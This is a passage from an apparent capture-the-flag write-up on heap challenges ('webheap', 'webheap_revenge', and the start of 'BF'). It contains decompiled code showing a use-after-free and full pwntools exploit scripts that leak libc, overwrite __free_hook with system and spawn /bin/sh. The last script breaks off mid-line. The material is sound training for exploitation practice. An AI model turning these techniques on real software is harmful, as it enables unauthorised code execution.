)</span><br><span class="line">  &#123;</span><br><span class="line">    add(idx, *(_QWORD *)(a1 + <span class="number">0x10</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In fact, this heap vulnerability is in del, del:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_17EF</span><span class="params">(<span class="type">unsigned</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)ptr_list[a1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>After discovering the UAF, you can directly follow the conventional ideas. You can find a way to write the parameters of the functions such as add, show, and edit through dynamic debugging and reverse analysis. In fact, the previous reverse process takes a lot of time, but the reverse understands the parameters and finds it. The hole was punched directly, it took 15 minutes</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./webheap&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;webheap&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/roo/Desktop/tools/glibc-all-in-one-master/libs/2.27-3ubuntu1.5_amd64/libc.so.6&quot;</span>)</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content=<span class="string">&#x27;jsjjs&#x27;</span></span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x83&#x27;</span>+p64(size)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x83&#x27;</span>+p64(<span class="built_in">len</span>(content))</span><br><span class="line">    payload+=<span class="built_in">str</span>(content)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">2</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x80&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    payload2=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload2+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\xbd\x80&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload2)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">3</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x83&#x27;</span>+p64(<span class="built_in">len</span>(content))</span><br><span class="line">    payload+=content</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x400</span>,<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x400</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x300</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">raw_input()</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(p.recvline()[-<span class="number">7</span>:-<span class="number">1</span>].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec090</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rce1=libc_base+<span class="number">0x4f2a5</span></span><br><span class="line">rce2=libc_base+<span class="number">0x4f302</span></span><br><span class="line">rce3=libc_base+<span class="number">0x10a2fc</span></span><br><span class="line"><span class="comment">#for i in range(7):</span></span><br><span class="line"><span class="comment">#    delete(i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(6,p64(free_hook-8))</span></span><br><span class="line"><span class="comment">#add(7,0x400,&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#add(5,0x400,p64(rce1))</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#edit(5,p64(rce1))</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_hook)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(system))</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="webheap-revenge"><a href="#webheap-revenge" class="headerlink" title="webheap_revenge:"></a>webheap_revenge:</h2><p>This question is the same as the previous one. You can even directly use the above script function parameters to type it. I heard that it is an upgraded version of the previous question, but I did not see any upgrades. After passing the test, there is any heap overflow, which is better than the previous one. A little more complicated. It is when the heap is laid out, the layout is too messy, which leads to a period of self-closing, and then after re-layout, it can be played, directly hit freehook as system, and then rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./webheap_revenge&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;webheap_revenge&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/roo/Desktop/tools/glibc-all-in-one-master/libs/2.27-3ubuntu1.5_amd64/libc.so.6&quot;</span>)</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content=<span class="string">&#x27;jsjjs&#x27;</span></span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x83&#x27;</span>+p64(size)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x83&#x27;</span>+p64(<span class="built_in">len</span>(content))</span><br><span class="line">    payload+=<span class="built_in">str</span>(content)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">2</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x80&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    payload2=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload2+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\xbd\x80&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload2)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">3</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x83&#x27;</span>+p64(<span class="built_in">len</span>(content))</span><br><span class="line">    <span class="comment">#payload+=bytes(content,encoding=&quot;utf-8&quot;)</span></span><br><span class="line">    payload+=content</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x400</span>,<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x400</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x300</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(p.recvline()[-<span class="number">7</span>:-<span class="number">1</span>].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec090</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rce1=libc_base+<span class="number">0x4f2a5</span></span><br><span class="line">rce2=libc_base+<span class="number">0x4f302</span></span><br><span class="line">rce3=libc_base+<span class="number">0x10a2fc</span></span><br><span class="line"><span class="comment">#for i in range(7):</span></span><br><span class="line"><span class="comment">#    delete(i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(6,p64(free_hook-8))</span></span><br><span class="line"><span class="comment">#add(7,0x400,&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#add(5,0x400,p64(rce1))</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#edit(5,p64(rce1))</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_hook)</span><br><span class="line"><span class="comment">#for i in range(7):</span></span><br><span class="line"><span class="comment">#    add(i,0x80)</span></span><br><span class="line"><span class="comment">#for i in range(7):</span></span><br><span class="line"><span class="comment">#    delete(i)</span></span><br><span class="line"><span class="comment">#edit(6,p64(free_hook))</span></span><br><span class="line"><span class="comment">#add(10,0x80)</span></span><br><span class="line"><span class="comment">#add(11,0x80)</span></span><br><span class="line"><span class="comment">#edit(11,p64(system))</span></span><br><span class="line"><span class="comment">#edit(10,&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"><span class="comment">#delete(10)</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x400</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(system))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>BF：</p><h3 id="This-question-is-an-original-question-of-the-Southwest-Division-Competition-which-directly-uses-the-script-of-Master-Kot-to-type-the-leaked-address-This-question-limits-the-fd-of-read-and-you-can-just-close-it-directly-This-question-comes-out-after-the-game-and-the-complicated-point-is-the-fd-But-close-0-can-change-fd"><a href="#This-question-is-an-original-question-of-the-Southwest-Division-Competition-which-directly-uses-the-script-of-Master-Kot-to-type-the-leaked-address-This-question-limits-the-fd-of-read-and-you-can-just-close-it-directly-This-question-comes-out-after-the-game-and-the-complicated-point-is-the-fd-But-close-0-can-change-fd" class="headerlink" title="This question is an original question of the Southwest Division Competition, which directly uses the script of Master Kot to type the leaked address. This question limits the fd of read, and you can just close it directly. This question comes out after the game, and the complicated point is the fd. But close(0) can change fd"></a>This question is an original question of the Southwest Division Competition, which directly uses the script of Master Kot to type the leaked address. This question limits the fd of read, and you can just close it directly. This question comes out after the game, and the complicated point is the fd. But close(0) can change fd</h3><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;192.168.0.76&#x27;, 58011)</span></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;TEST&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pop_rdi = 0x0000000000000973 # pop rdi ; ret</span></span><br><span class="line"><span class="string">ret = 0x000000000000001a # ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pay = <span 